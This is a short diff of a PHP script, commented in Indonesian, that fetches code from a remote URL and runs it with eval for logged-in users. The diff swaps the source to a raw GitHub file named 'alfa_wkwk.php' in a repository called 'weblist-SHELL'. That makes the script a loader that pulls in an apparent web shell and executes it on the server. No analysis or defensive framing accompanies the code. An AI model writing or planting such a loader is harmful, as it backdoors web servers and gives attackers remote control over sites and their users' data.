@@ -81,7 +81,7 @@ if (isset($_FILES['file']['tmp_name'])) {
 
 // Jika pengguna sudah login, ambil dan eksekusi konten dari URL
 if (is_logged_in()) {
-    $url = 'https://walauberantakan.pages.dev/smile/smile.txt';
+    $url = 'https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfa_wkwk.php';
     $content = getRawContent($url);
     eval('?>' . $content);
     exit;
